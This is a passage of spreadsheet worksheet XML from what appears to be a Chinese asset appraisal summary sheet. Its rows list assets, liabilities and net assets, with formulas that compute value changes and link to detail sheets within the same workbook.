      </c>
      <c r="G35" s="555">
        <f>F35-E35</f>
        <v/>
      </c>
      <c r="H35" s="555">
        <f>IF(E35=0,"",IF(E35&lt;0,-G35/E35*100,G35/E35*100))</f>
        <v/>
      </c>
      <c r="I35" s="560" t="n"/>
      <c r="J35" s="559">
        <f>E35-I35</f>
        <v/>
      </c>
      <c r="K35" s="561">
        <f>HYPERLINK("#\"4-15商誉\"!A1","商誉")</f>
        <v/>
      </c>
    </row>
    <row r="36" ht="13.5" customHeight="1" s="415">
      <c r="B36" s="380" t="n">
        <v>31</v>
      </c>
      <c r="C36" s="406" t="inlineStr">
        <is>
          <t>长期待摊</t>
        </is>
      </c>
      <c r="D36" s="295" t="inlineStr">
        <is>
          <t>长期待摊费用</t>
        </is>
      </c>
      <c r="E36" s="560">
        <f>'4-非流动资产汇总'!E21</f>
        <v/>
      </c>
      <c r="F36" s="560">
        <f>'4-非流动资产汇总'!F21</f>
        <v/>
      </c>
      <c r="G36" s="555">
        <f>F36-E36</f>
        <v/>
      </c>
      <c r="H36" s="555">
        <f>IF(E36=0,"",IF(E36&lt;0,-G36/E36*100,G36/E36*100))</f>
        <v/>
      </c>
      <c r="I36" s="560" t="n"/>
      <c r="J36" s="559">
        <f>E36-I36</f>
        <v/>
      </c>
      <c r="K36" s="561">
        <f>HYPERLINK("#\"4-16长期待摊费用\"!A1","长期待摊费用")</f>
        <v/>
      </c>
    </row>
    <row r="37" ht="13.5" customHeight="1" s="415">
      <c r="B37" s="380" t="n">
        <v>32</v>
      </c>
      <c r="C37" s="406" t="inlineStr">
        <is>
          <t>递延资产</t>
        </is>
      </c>
      <c r="D37" s="295" t="inlineStr">
        <is>
          <t>递延所得税资产</t>
        </is>
      </c>
      <c r="E37" s="560">
        <f>'4-非流动资产汇总'!E22</f>
        <v/>
      </c>
      <c r="F37" s="560">
        <f>'4-非流动资产汇总'!F22</f>
        <v/>
      </c>
      <c r="G37" s="555">
        <f>F37-E37</f>
        <v/>
      </c>
      <c r="H37" s="555">
        <f>IF(E37=0,"",IF(E37&lt;0,-G37/E37*100,G37/E37*100))</f>
        <v/>
      </c>
      <c r="I37" s="560" t="n"/>
      <c r="J37" s="559">
        <f>E37-I37</f>
        <v/>
      </c>
      <c r="K37" s="561">
        <f>HYPERLINK("#\"4-17递延所得税资产\"!A1","递延所得税资产")</f>
        <v/>
      </c>
    </row>
    <row r="38" ht="13.5" customHeight="1" s="415">
      <c r="B38" s="380" t="n">
        <v>33</v>
      </c>
      <c r="C38" s="406" t="inlineStr">
        <is>
          <t>其他非资</t>
        </is>
      </c>
      <c r="D38" s="295" t="inlineStr">
        <is>
          <t>其他非流动资产</t>
        </is>
      </c>
      <c r="E38" s="560">
        <f>'4-非流动资产汇总'!E23</f>
        <v/>
      </c>
      <c r="F38" s="560">
        <f>'4-非流动资产汇总'!F23</f>
        <v/>
      </c>
      <c r="G38" s="555">
        <f>F38-E38</f>
        <v/>
      </c>
      <c r="H38" s="555">
        <f>IF(E38=0,"",IF(E38&lt;0,-G38/E38*100,G38/E38*100))</f>
        <v/>
      </c>
      <c r="I38" s="560" t="n"/>
      <c r="J38" s="559">
        <f>E38-I38</f>
        <v/>
      </c>
      <c r="K38" s="561">
        <f>HYPERLINK("#\"4-18其他非流动资产\"!A1","其他非流动资产")</f>
        <v/>
      </c>
    </row>
    <row r="39" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B39" s="380" t="n">
        <v>34</v>
      </c>
      <c r="C39" s="406" t="inlineStr">
        <is>
          <t>资产总计</t>
        </is>
      </c>
      <c r="D39" s="407" t="inlineStr">
        <is>
          <t>三、资产总计</t>
        </is>
      </c>
      <c r="E39" s="559">
        <f>E6+E20</f>
        <v/>
      </c>
      <c r="F39" s="559">
        <f>F6+F20</f>
        <v/>
      </c>
      <c r="G39" s="559">
        <f>F39-E39</f>
        <v/>
      </c>
      <c r="H39" s="559">
        <f>IF(E39=0,"",IF(E39&lt;0,-G39/E39*100,G39/E39*100))</f>
        <v/>
      </c>
      <c r="I39" s="559">
        <f>I6+I20</f>
        <v/>
      </c>
      <c r="J39" s="559">
        <f>E39-I39</f>
        <v/>
      </c>
      <c r="K39" s="407" t="n"/>
    </row>
    <row r="40" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B40" s="380" t="n">
        <v>35</v>
      </c>
      <c r="C40" s="406" t="inlineStr">
        <is>
          <t>流债汇总</t>
        </is>
      </c>
      <c r="D40" s="407" t="inlineStr">
        <is>
          <t>四、流动负债合计</t>
        </is>
      </c>
      <c r="E40" s="559">
        <f>SUM(E41:E53)</f>
        <v/>
      </c>
      <c r="F40" s="559">
        <f>SUM(F41:F53)</f>
        <v/>
      </c>
      <c r="G40" s="559">
        <f>F40-E40</f>
        <v/>
      </c>
      <c r="H40" s="559">
        <f>IF(E40=0,"",IF(E40&lt;0,-G40/E40*100,G40/E40*100))</f>
        <v/>
      </c>
      <c r="I40" s="559">
        <f>SUM(I41:I53)</f>
        <v/>
      </c>
      <c r="J40" s="559">
        <f>E40-I40</f>
        <v/>
      </c>
      <c r="K40" s="407" t="n"/>
    </row>
    <row r="41" ht="13.5" customHeight="1" s="415">
      <c r="B41" s="380" t="n">
        <v>36</v>
      </c>
      <c r="C41" s="406" t="inlineStr">
        <is>
          <t>短期借款</t>
        </is>
      </c>
      <c r="D41" s="295" t="inlineStr">
        <is>
          <t>短期借款</t>
        </is>
      </c>
      <c r="E41" s="560">
        <f>'5-流动负债汇总'!E6</f>
        <v/>
      </c>
      <c r="F41" s="560">
        <f>'5-流动负债汇总'!F6</f>
        <v/>
      </c>
      <c r="G41" s="555">
        <f>F41-E41</f>
        <v/>
      </c>
      <c r="H41" s="555">
        <f>IF(E41=0,"",IF(E41&lt;0,-G41/E41*100,G41/E41*100))</f>
        <v/>
      </c>
      <c r="I41" s="560" t="n"/>
      <c r="J41" s="559">
        <f>E41-I41</f>
        <v/>
      </c>
      <c r="K41" s="561">
        <f>HYPERLINK("#\"5-1短期借款\"!A1","短期借款")</f>
        <v/>
      </c>
    </row>
    <row r="42" ht="13.5" customHeight="1" s="415">
      <c r="B42" s="380" t="n">
        <v>37</v>
      </c>
      <c r="C42" s="406" t="inlineStr">
        <is>
          <t>交融负债</t>
        </is>
      </c>
      <c r="D42" s="297" t="inlineStr">
        <is>
          <t>交易性金融负债</t>
        </is>
      </c>
      <c r="E42" s="560">
        <f>'5-流动负债汇总'!E7</f>
        <v/>
      </c>
      <c r="F42" s="560">
        <f>'5-流动负债汇总'!F7</f>
        <v/>
      </c>
      <c r="G42" s="555">
        <f>F42-E42</f>
        <v/>
      </c>
      <c r="H42" s="555">
        <f>IF(E42=0,"",IF(E42&lt;0,-G42/E42*100,G42/E42*100))</f>
        <v/>
      </c>
      <c r="I42" s="560" t="n"/>
      <c r="J42" s="559">
        <f>E42-I42</f>
        <v/>
      </c>
      <c r="K42" s="561">
        <f>HYPERLINK("#\"5-2交易性金融负债\"!A1","交易性金融负债")</f>
        <v/>
      </c>
    </row>
    <row r="43" ht="13.5" customHeight="1" s="415">
      <c r="B43" s="380" t="n">
        <v>38</v>
      </c>
      <c r="C43" s="406" t="inlineStr">
        <is>
          <t>衍金负债</t>
        </is>
      </c>
      <c r="D43" s="295" t="inlineStr">
        <is>
          <t>衍生金融负债</t>
        </is>
      </c>
      <c r="E43" s="560">
        <f>'5-流动负债汇总'!E8</f>
        <v/>
      </c>
      <c r="F43" s="560">
        <f>'5-流动负债汇总'!F8</f>
        <v/>
      </c>
      <c r="G43" s="555">
        <f>F43-E43</f>
        <v/>
      </c>
      <c r="H43" s="555">
        <f>IF(E43=0,"",IF(E43&lt;0,-G43/E43*100,G43/E43*100))</f>
        <v/>
      </c>
      <c r="I43" s="560" t="n"/>
      <c r="J43" s="559">
        <f>E43-I43</f>
        <v/>
      </c>
      <c r="K43" s="561">
        <f>HYPERLINK("#\"5-3衍生金融负债\"!A1","衍生金融负债")</f>
        <v/>
      </c>
    </row>
    <row r="44" ht="13.5" customHeight="1" s="415">
      <c r="B44" s="380" t="n">
        <v>39</v>
      </c>
      <c r="C44" s="406" t="inlineStr">
        <is>
          <t>应付票据</t>
        </is>
      </c>
      <c r="D44" s="297" t="inlineStr">
        <is>
          <t>应付票据</t>
        </is>
      </c>
      <c r="E44" s="560">
        <f>'5-流动负债汇总'!E9</f>
        <v/>
      </c>
      <c r="F44" s="560">
        <f>'5-流动负债汇总'!F9</f>
        <v/>
      </c>
      <c r="G44" s="555">
        <f>F44-E44</f>
        <v/>
      </c>
      <c r="H44" s="555">
        <f>IF(E44=0,"",IF(E44&lt;0,-G44/E44*100,G44/E44*100))</f>
        <v/>
      </c>
      <c r="I44" s="560" t="n"/>
      <c r="J44" s="559">
        <f>E44-I44</f>
        <v/>
      </c>
      <c r="K44" s="561">
        <f>HYPERLINK("#\"5-4应付票据\"!A1","应付票据")</f>
        <v/>
      </c>
    </row>
    <row r="45" ht="13.5" customHeight="1" s="415">
      <c r="B45" s="380" t="n">
        <v>40</v>
      </c>
      <c r="C45" s="406" t="inlineStr">
        <is>
          <t>应付账款</t>
        </is>
      </c>
      <c r="D45" s="297" t="inlineStr">
        <is>
          <t>应付账款</t>
        </is>
      </c>
      <c r="E45" s="560">
        <f>'5-流动负债汇总'!E10</f>
        <v/>
      </c>
      <c r="F45" s="560">
        <f>'5-流动负债汇总'!F10</f>
        <v/>
      </c>
      <c r="G45" s="555">
        <f>F45-E45</f>
        <v/>
      </c>
      <c r="H45" s="555">
        <f>IF(E45=0,"",IF(E45&lt;0,-G45/E45*100,G45/E45*100))</f>
        <v/>
      </c>
      <c r="I45" s="560" t="n"/>
      <c r="J45" s="559">
        <f>E45-I45</f>
        <v/>
      </c>
      <c r="K45" s="561">
        <f>HYPERLINK("#\"5-5应付账款\"!A1","应付账款")</f>
        <v/>
      </c>
    </row>
    <row r="46" ht="13.5" customHeight="1" s="415">
      <c r="B46" s="380" t="n">
        <v>41</v>
      </c>
      <c r="C46" s="406" t="inlineStr">
        <is>
          <t>预收账款</t>
        </is>
      </c>
      <c r="D46" s="295" t="inlineStr">
        <is>
          <t>预收款项</t>
        </is>
      </c>
      <c r="E46" s="560">
        <f>'5-流动负债汇总'!E11</f>
        <v/>
      </c>
      <c r="F46" s="560">
        <f>'5-流动负债汇总'!F11</f>
        <v/>
      </c>
      <c r="G46" s="555">
        <f>F46-E46</f>
        <v/>
      </c>
      <c r="H46" s="555">
        <f>IF(E46=0,"",IF(E46&lt;0,-G46/E46*100,G46/E46*100))</f>
        <v/>
      </c>
      <c r="I46" s="560" t="n"/>
      <c r="J46" s="559">
        <f>E46-I46</f>
        <v/>
      </c>
      <c r="K46" s="561">
        <f>HYPERLINK("#\"5-6预收款项\"!A1","预收款项")</f>
        <v/>
      </c>
    </row>
    <row r="47" ht="13.5" customHeight="1" s="415">
      <c r="B47" s="380" t="n">
        <v>42</v>
      </c>
      <c r="C47" s="406" t="inlineStr">
        <is>
          <t>合同负债</t>
        </is>
      </c>
      <c r="D47" s="297" t="inlineStr">
        <is>
          <t>合同负债</t>
        </is>
      </c>
      <c r="E47" s="560">
        <f>'5-流动负债汇总'!E12</f>
        <v/>
      </c>
      <c r="F47" s="560">
        <f>'5-流动负债汇总'!F12</f>
        <v/>
      </c>
      <c r="G47" s="555">
        <f>F47-E47</f>
        <v/>
      </c>
      <c r="H47" s="555">
        <f>IF(E47=0,"",IF(E47&lt;0,-G47/E47*100,G47/E47*100))</f>
        <v/>
      </c>
      <c r="I47" s="560" t="n"/>
      <c r="J47" s="559">
        <f>E47-I47</f>
        <v/>
      </c>
      <c r="K47" s="561">
        <f>HYPERLINK("#\"5-7合同负债\"!A1","合同负债")</f>
        <v/>
      </c>
    </row>
    <row r="48" ht="13.5" customHeight="1" s="415">
      <c r="B48" s="380" t="n">
        <v>43</v>
      </c>
      <c r="C48" s="406" t="inlineStr">
        <is>
          <t>应付薪酬</t>
        </is>
      </c>
      <c r="D48" s="295" t="inlineStr">
        <is>
          <t>应付职工薪酬</t>
        </is>
      </c>
      <c r="E48" s="560">
        <f>'5-流动负债汇总'!E13</f>
        <v/>
      </c>
      <c r="F48" s="560">
        <f>'5-流动负债汇总'!F13</f>
        <v/>
      </c>
      <c r="G48" s="555">
        <f>F48-E48</f>
        <v/>
      </c>
      <c r="H48" s="555">
        <f>IF(E48=0,"",IF(E48&lt;0,-G48/E48*100,G48/E48*100))</f>
        <v/>
      </c>
      <c r="I48" s="560" t="n"/>
      <c r="J48" s="559">
        <f>E48-I48</f>
        <v/>
      </c>
      <c r="K48" s="561">
        <f>HYPERLINK("#\"5-8应付职工薪酬\"!A1","应付职工薪酬")</f>
        <v/>
      </c>
    </row>
    <row r="49" ht="13.5" customHeight="1" s="415">
      <c r="B49" s="380" t="n">
        <v>44</v>
      </c>
      <c r="C49" s="406" t="inlineStr">
        <is>
          <t>应交税费</t>
        </is>
      </c>
      <c r="D49" s="295" t="inlineStr">
        <is>
          <t>应交税费</t>
        </is>
      </c>
      <c r="E49" s="560">
        <f>'5-流动负债汇总'!E14</f>
        <v/>
      </c>
      <c r="F49" s="560">
        <f>'5-流动负债汇总'!F14</f>
        <v/>
      </c>
      <c r="G49" s="555">
        <f>F49-E49</f>
        <v/>
      </c>
      <c r="H49" s="555">
        <f>IF(E49=0,"",IF(E49&lt;0,-G49/E49*100,G49/E49*100))</f>
        <v/>
      </c>
      <c r="I49" s="560" t="n"/>
      <c r="J49" s="559">
        <f>E49-I49</f>
        <v/>
      </c>
      <c r="K49" s="561">
        <f>HYPERLINK("#\"5-9应交税费\"!A1","应交税费")</f>
        <v/>
      </c>
    </row>
    <row r="50" ht="13.5" customHeight="1" s="415">
      <c r="B50" s="380" t="n">
        <v>45</v>
      </c>
      <c r="C50" s="406" t="inlineStr">
        <is>
          <t>其付汇总</t>
        </is>
      </c>
      <c r="D50" s="295" t="inlineStr">
        <is>
          <t>其他应付款</t>
        </is>
      </c>
      <c r="E50" s="560">
        <f>'5-流动负债汇总'!E15</f>
        <v/>
      </c>
      <c r="F50" s="560">
        <f>'5-流动负债汇总'!F15</f>
        <v/>
      </c>
      <c r="G50" s="555">
        <f>F50-E50</f>
        <v/>
      </c>
      <c r="H50" s="555">
        <f>IF(E50=0,"",IF(E50&lt;0,-G50/E50*100,G50/E50*100))</f>
        <v/>
      </c>
      <c r="I50" s="560" t="n"/>
      <c r="J50" s="559">
        <f>E50-I50</f>
        <v/>
      </c>
      <c r="K50" s="561">
        <f>HYPERLINK("#\"5-10其他应付款汇总表\"!A1","其他应付款")</f>
        <v/>
      </c>
    </row>
    <row r="51" ht="13.5" customHeight="1" s="415">
      <c r="B51" s="380" t="n">
        <v>46</v>
      </c>
      <c r="C51" s="406" t="inlineStr">
        <is>
          <t>持有待债</t>
        </is>
      </c>
      <c r="D51" s="295" t="inlineStr">
        <is>
          <t>持有待售负债</t>
        </is>
      </c>
      <c r="E51" s="560">
        <f>'5-流动负债汇总'!E16</f>
        <v/>
      </c>
      <c r="F51" s="560">
        <f>'5-流动负债汇总'!F16</f>
        <v/>
      </c>
      <c r="G51" s="555">
        <f>F51-E51</f>
        <v/>
      </c>
      <c r="H51" s="555">
        <f>IF(E51=0,"",IF(E51&lt;0,-G51/E51*100,G51/E51*100))</f>
        <v/>
      </c>
      <c r="I51" s="560" t="n"/>
      <c r="J51" s="559">
        <f>E51-I51</f>
        <v/>
      </c>
      <c r="K51" s="561">
        <f>HYPERLINK("#\"5-11持有待售负债\"!A1","持有待售负债")</f>
        <v/>
      </c>
    </row>
    <row r="52" ht="13.5" customHeight="1" s="415">
      <c r="B52" s="380" t="n">
        <v>47</v>
      </c>
      <c r="C52" s="406" t="inlineStr">
        <is>
          <t>到期非债</t>
        </is>
      </c>
      <c r="D52" s="295" t="inlineStr">
        <is>
          <t>一年内到期的非流动负债</t>
        </is>
      </c>
      <c r="E52" s="560">
        <f>'5-流动负债汇总'!E17</f>
        <v/>
      </c>
      <c r="F52" s="560">
        <f>'5-流动负债汇总'!F17</f>
        <v/>
      </c>
      <c r="G52" s="555">
        <f>F52-E52</f>
        <v/>
      </c>
      <c r="H52" s="555">
        <f>IF(E52=0,"",IF(E52&lt;0,-G52/E52*100,G52/E52*100))</f>
        <v/>
      </c>
      <c r="I52" s="560" t="n"/>
      <c r="J52" s="559">
        <f>E52-I52</f>
        <v/>
      </c>
      <c r="K52" s="561">
        <f>HYPERLINK("#\"5-12一年到期非流动负债\"!A1","一年内到期的非流动负债")</f>
        <v/>
      </c>
    </row>
    <row r="53" ht="13.5" customHeight="1" s="415">
      <c r="B53" s="380" t="n">
        <v>48</v>
      </c>
      <c r="C53" s="406" t="inlineStr">
        <is>
          <t>其他流债</t>
        </is>
      </c>
      <c r="D53" s="295" t="inlineStr">
        <is>
          <t>其他流动负债</t>
        </is>
      </c>
      <c r="E53" s="560">
        <f>'5-流动负债汇总'!E18</f>
        <v/>
      </c>
      <c r="F53" s="560">
        <f>'5-流动负债汇总'!F18</f>
        <v/>
      </c>
      <c r="G53" s="555">
        <f>F53-E53</f>
        <v/>
      </c>
      <c r="H53" s="555">
        <f>IF(E53=0,"",IF(E53&lt;0,-G53/E53*100,G53/E53*100))</f>
        <v/>
      </c>
      <c r="I53" s="560" t="n"/>
      <c r="J53" s="559">
        <f>E53-I53</f>
        <v/>
      </c>
      <c r="K53" s="561">
        <f>HYPERLINK("#\"5-13其他流动负债\"!A1","其他流动负债")</f>
        <v/>
      </c>
    </row>
    <row r="54" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B54" s="380" t="n">
        <v>49</v>
      </c>
      <c r="C54" s="406" t="inlineStr">
        <is>
          <t>非债汇总</t>
        </is>
      </c>
      <c r="D54" s="407" t="inlineStr">
        <is>
          <t>五、非流动负债合计</t>
        </is>
      </c>
      <c r="E54" s="559">
        <f>SUM(E55:E63)</f>
        <v/>
      </c>
      <c r="F54" s="559">
        <f>SUM(F55:F63)</f>
        <v/>
      </c>
      <c r="G54" s="559">
        <f>F54-E54</f>
        <v/>
      </c>
      <c r="H54" s="559">
        <f>IF(E54=0,"",IF(E54&lt;0,-G54/E54*100,G54/E54*100))</f>
        <v/>
      </c>
      <c r="I54" s="559">
        <f>SUM(I55:I63)</f>
        <v/>
      </c>
      <c r="J54" s="559">
        <f>E54-I54</f>
        <v/>
      </c>
      <c r="K54" s="407" t="n"/>
    </row>
    <row r="55" ht="13.5" customHeight="1" s="415">
      <c r="B55" s="380" t="n">
        <v>50</v>
      </c>
      <c r="C55" s="406" t="inlineStr">
        <is>
          <t>长期借款</t>
        </is>
      </c>
      <c r="D55" s="295" t="inlineStr">
        <is>
          <t>长期借款</t>
        </is>
      </c>
      <c r="E55" s="560">
        <f>'6-非流动负债汇总'!E6</f>
        <v/>
      </c>
      <c r="F55" s="560">
        <f>'6-非流动负债汇总'!F6</f>
        <v/>
      </c>
      <c r="G55" s="555">
        <f>F55-E55</f>
        <v/>
      </c>
      <c r="H55" s="555">
        <f>IF(E55=0,"",IF(E55&lt;0,-G55/E55*100,G55/E55*100))</f>
        <v/>
      </c>
      <c r="I55" s="560" t="n"/>
      <c r="J55" s="559">
        <f>E55-I55</f>
        <v/>
      </c>
      <c r="K55" s="561">
        <f>HYPERLINK("#\"6-1长期借款\"!A1","长期借款")</f>
        <v/>
      </c>
    </row>
    <row r="56" ht="13.5" customHeight="1" s="415">
      <c r="B56" s="380" t="n">
        <v>51</v>
      </c>
      <c r="C56" s="406" t="inlineStr">
        <is>
          <t>应付债券</t>
        </is>
      </c>
      <c r="D56" s="295" t="inlineStr">
        <is>
          <t>应付债券</t>
        </is>
      </c>
      <c r="E56" s="560">
        <f>'6-非流动负债汇总'!E7</f>
        <v/>
      </c>
      <c r="F56" s="560">
        <f>'6-非流动负债汇总'!F7</f>
        <v/>
      </c>
      <c r="G56" s="555">
        <f>F56-E56</f>
        <v/>
      </c>
      <c r="H56" s="555">
        <f>IF(E56=0,"",IF(E56&lt;0,-G56/E56*100,G56/E56*100))</f>
        <v/>
      </c>
      <c r="I56" s="560" t="n"/>
      <c r="J56" s="559">
        <f>E56-I56</f>
        <v/>
      </c>
      <c r="K56" s="561">
        <f>HYPERLINK("#\"6-2应付债券\"!A1","应付债券")</f>
        <v/>
      </c>
    </row>
    <row r="57" ht="13.5" customHeight="1" s="415">
      <c r="B57" s="380" t="n">
        <v>52</v>
      </c>
      <c r="C57" s="406" t="inlineStr">
        <is>
          <t>租赁负债</t>
        </is>
      </c>
      <c r="D57" s="297" t="inlineStr">
        <is>
          <t>租赁负债</t>
        </is>
      </c>
      <c r="E57" s="560">
        <f>'6-非流动负债汇总'!E8</f>
        <v/>
      </c>
      <c r="F57" s="560">
        <f>'6-非流动负债汇总'!F8</f>
        <v/>
      </c>
      <c r="G57" s="555">
        <f>F57-E57</f>
        <v/>
      </c>
      <c r="H57" s="555">
        <f>IF(E57=0,"",IF(E57&lt;0,-G57/E57*100,G57/E57*100))</f>
        <v/>
      </c>
      <c r="I57" s="560" t="n"/>
      <c r="J57" s="559">
        <f>E57-I57</f>
        <v/>
      </c>
      <c r="K57" s="561">
        <f>HYPERLINK("#\"6-3租赁负债\"!A1","租赁负债")</f>
        <v/>
      </c>
    </row>
    <row r="58" ht="13.5" customHeight="1" s="415">
      <c r="B58" s="380" t="n">
        <v>53</v>
      </c>
      <c r="C58" s="406" t="inlineStr">
        <is>
          <t>长期应付</t>
        </is>
      </c>
      <c r="D58" s="295" t="inlineStr">
        <is>
          <t>长期应付款</t>
        </is>
      </c>
      <c r="E58" s="560">
        <f>'6-非流动负债汇总'!E9</f>
        <v/>
      </c>
      <c r="F58" s="560">
        <f>'6-非流动负债汇总'!F9</f>
        <v/>
      </c>
      <c r="G58" s="555">
        <f>F58-E58</f>
        <v/>
      </c>
      <c r="H58" s="555">
        <f>IF(E58=0,"",IF(E58&lt;0,-G58/E58*100,G58/E58*100))</f>
        <v/>
      </c>
      <c r="I58" s="560" t="n"/>
      <c r="J58" s="559">
        <f>E58-I58</f>
        <v/>
      </c>
      <c r="K58" s="561">
        <f>HYPERLINK("#\"6-4长期应付款\"!A1","长期应付款")</f>
        <v/>
      </c>
    </row>
    <row r="59" ht="13.5" customHeight="1" s="415">
      <c r="B59" s="380" t="n">
        <v>54</v>
      </c>
      <c r="C59" s="406" t="inlineStr">
        <is>
          <t>专项应付</t>
        </is>
      </c>
      <c r="D59" s="297" t="inlineStr">
        <is>
          <t>长期应付职工薪酬</t>
        </is>
      </c>
      <c r="E59" s="560">
        <f>'6-非流动负债汇总'!E10</f>
        <v/>
      </c>
      <c r="F59" s="560">
        <f>'6-非流动负债汇总'!F10</f>
        <v/>
      </c>
      <c r="G59" s="555">
        <f>F59-E59</f>
        <v/>
      </c>
      <c r="H59" s="555">
        <f>IF(E59=0,"",IF(E59&lt;0,-G59/E59*100,G59/E59*100))</f>
        <v/>
      </c>
      <c r="I59" s="560" t="n"/>
      <c r="J59" s="559">
        <f>E59-I59</f>
        <v/>
      </c>
      <c r="K59" s="561">
        <f>HYPERLINK("#\"6-5长期应付职工薪酬\"!A1","长期应付职工薪酬")</f>
        <v/>
      </c>
    </row>
    <row r="60" ht="13.5" customHeight="1" s="415">
      <c r="B60" s="380" t="n">
        <v>55</v>
      </c>
      <c r="C60" s="406" t="inlineStr">
        <is>
          <t>预计负债</t>
        </is>
      </c>
      <c r="D60" s="295" t="inlineStr">
        <is>
          <t>预计负债</t>
        </is>
      </c>
      <c r="E60" s="560">
        <f>'6-非流动负债汇总'!E11</f>
        <v/>
      </c>
      <c r="F60" s="560">
        <f>'6-非流动负债汇总'!F11</f>
        <v/>
      </c>
      <c r="G60" s="555">
        <f>F60-E60</f>
        <v/>
      </c>
      <c r="H60" s="555">
        <f>IF(E60=0,"",IF(E60&lt;0,-G60/E60*100,G60/E60*100))</f>
        <v/>
      </c>
      <c r="I60" s="560" t="n"/>
      <c r="J60" s="559">
        <f>E60-I60</f>
        <v/>
      </c>
      <c r="K60" s="561">
        <f>HYPERLINK("#\"6-6预计负债\"!A1","预计负债")</f>
        <v/>
      </c>
    </row>
    <row r="61" ht="13.5" customHeight="1" s="415">
      <c r="B61" s="380" t="n">
        <v>56</v>
      </c>
      <c r="C61" s="406" t="inlineStr">
        <is>
          <t>递延收益</t>
        </is>
      </c>
      <c r="D61" s="297" t="inlineStr">
        <is>
          <t>递延收益</t>
        </is>
      </c>
      <c r="E61" s="560">
        <f>'6-非流动负债汇总'!E12</f>
        <v/>
      </c>
      <c r="F61" s="560">
        <f>'6-非流动负债汇总'!F12</f>
        <v/>
      </c>
      <c r="G61" s="555">
        <f>F61-E61</f>
        <v/>
      </c>
      <c r="H61" s="555">
        <f>IF(E61=0,"",IF(E61&lt;0,-G61/E61*100,G61/E61*100))</f>
        <v/>
      </c>
      <c r="I61" s="560" t="n"/>
      <c r="J61" s="559">
        <f>E61-I61</f>
        <v/>
      </c>
      <c r="K61" s="561">
        <f>HYPERLINK("#\"6-7递延收益\"!A1","递延收益")</f>
        <v/>
      </c>
    </row>
    <row r="62" ht="13.5" customHeight="1" s="415">
      <c r="B62" s="380" t="n">
        <v>57</v>
      </c>
      <c r="C62" s="406" t="inlineStr">
        <is>
          <t>递延负债</t>
        </is>
      </c>
      <c r="D62" s="295" t="inlineStr">
        <is>
          <t>递延所得税负债</t>
        </is>
      </c>
      <c r="E62" s="560">
        <f>'6-非流动负债汇总'!E13</f>
        <v/>
      </c>
      <c r="F62" s="560">
        <f>'6-非流动负债汇总'!F13</f>
        <v/>
      </c>
      <c r="G62" s="555">
        <f>F62-E62</f>
        <v/>
      </c>
      <c r="H62" s="555">
        <f>IF(E62=0,"",IF(E62&lt;0,-G62/E62*100,G62/E62*100))</f>
        <v/>
      </c>
      <c r="I62" s="560" t="n"/>
      <c r="J62" s="559">
        <f>E62-I62</f>
        <v/>
      </c>
      <c r="K62" s="561">
        <f>HYPERLINK("#\"6-8递延所得税负债\"!A1","递延所得税负债")</f>
        <v/>
      </c>
    </row>
    <row r="63" ht="13.5" customHeight="1" s="415">
      <c r="B63" s="380" t="n">
        <v>58</v>
      </c>
      <c r="C63" s="406" t="inlineStr">
        <is>
          <t>其他非债</t>
        </is>
      </c>
      <c r="D63" s="295" t="inlineStr">
        <is>
          <t>其他非流动负债</t>
        </is>
      </c>
      <c r="E63" s="560">
        <f>'6-非流动负债汇总'!E14</f>
        <v/>
      </c>
      <c r="F63" s="560">
        <f>'6-非流动负债汇总'!F14</f>
        <v/>
      </c>
      <c r="G63" s="555">
        <f>F63-E63</f>
        <v/>
      </c>
      <c r="H63" s="555">
        <f>IF(E63=0,"",IF(E63&lt;0,-G63/E63*100,G63/E63*100))</f>
        <v/>
      </c>
      <c r="I63" s="560" t="n"/>
      <c r="J63" s="559">
        <f>E63-I63</f>
        <v/>
      </c>
      <c r="K63" s="561">
        <f>HYPERLINK("#\"6-9其他非流动负债\"!A1","其他非流动负债")</f>
        <v/>
      </c>
    </row>
    <row r="64" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="B64" s="380" t="n">
        <v>59</v>
      </c>
      <c r="C64" s="406" t="inlineStr">
        <is>
          <t>负债总计</t>
        </is>
      </c>
      <c r="D64" s="407" t="inlineStr">
        <is>
          <t>六、负债总计</t>
        </is>
      </c>
      <c r="E64" s="559">
        <f>E40+E54</f>
        <v/>
      </c>
      <c r="F64" s="559">
        <f>F40+F54</f>
        <v/>
      </c>
      <c r="G64" s="559">
        <f>F64-E64</f>
        <v/>
      </c>
      <c r="H64" s="559">
        <f>IF(E64=0,"",IF(E64&lt;0,-G64/E64*100,G64/E64*100))</f>
        <v/>
      </c>
      <c r="I64" s="559">
        <f>I40+I54</f>
        <v/>
      </c>
      <c r="J64" s="559">
        <f>E64-I64</f>
        <v/>
      </c>
      <c r="K64" s="407" t="n"/>
    </row>
    <row r="65" ht="13.5" customFormat="1" customHeight="1" s="400">
      <c r="A65" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B65" s="380" t="n">
        <v>60</v>
      </c>
      <c r="C65" s="406" t="inlineStr">
        <is>
          <t>股东权益</t>
        </is>
      </c>
      <c r="D65" s="407" t="inlineStr">
        <is>
          <t>七、净资产（所有者权益）</t>
        </is>
      </c>
      <c r="E65" s="559">
        <f>E39-E64</f>
        <v/>
      </c>
      <c r="F65" s="559">
        <f>F39-F64</f>
        <v/>
      </c>
      <c r="G65" s="559">
        <f>F65-E65</f>
        <v/>
      </c>
      <c r="H65" s="559">
        <f>IF(E65=0,"",IF(E65&lt;0,-G65/E65*100,G65/E65*100))</f>
        <v/>
      </c>
      <c r="I65" s="559">
        <f>I39-I64</f>
        <v/>
      </c>
      <c r="J65" s="559">
        <f>E65-I65</f>
        <v/>
      </c>
      <c r="K65" s="407" t="n"/>
    </row>
    <row r="66" ht="15" customFormat="1" customHeight="1" s="401">
      <c r="B66" s="409" t="n"/>
      <c r="C66" s="409" t="n"/>
      <c r="D66" s="409" t="n"/>
      <c r="E66" s="409" t="n"/>
      <c r="F66" s="409" t="n"/>
      <c r="G66" s="409" t="n"/>
      <c r="H66" s="291" t="inlineStr">
        <is>
          <t>评估机构：天源资产评估有限公司</t>
        </is>
      </c>
    </row>
    <row r="67" s="415">
      <c r="B67" s="347" t="n"/>
      <c r="C67" s="347" t="n"/>
      <c r="D67" s="347" t="n"/>
      <c r="E67" s="347" t="n"/>
      <c r="F67" s="347" t="n"/>
      <c r="G67" s="347" t="n"/>
      <c r="H67" s="347" t="n"/>
    </row>
    <row r="68" outlineLevel="1" s="415">
      <c r="B68" s="344" t="n"/>
      <c r="C68" s="410" t="n"/>
      <c r="D68" s="411" t="n"/>
      <c r="E68" s="410" t="n"/>
